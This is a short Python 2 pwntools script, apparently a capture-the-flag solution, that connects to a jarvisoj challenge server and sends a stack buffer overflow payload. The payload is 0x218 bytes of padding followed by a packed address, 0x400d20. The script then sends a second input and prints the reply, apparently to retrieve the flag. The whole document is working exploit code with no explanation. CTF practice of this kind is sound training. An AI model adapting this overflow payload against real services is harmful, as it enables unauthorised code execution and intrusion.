from pwn import *
newadr_flag=0x400d20
p=remote('pwn.jarvisoj.com',9877)
p.recv()
payload=0x218*"a"+p64(newadr_flag)
p.sendline(payload)
p.recv()
p.sendline("?")
print p.recv()
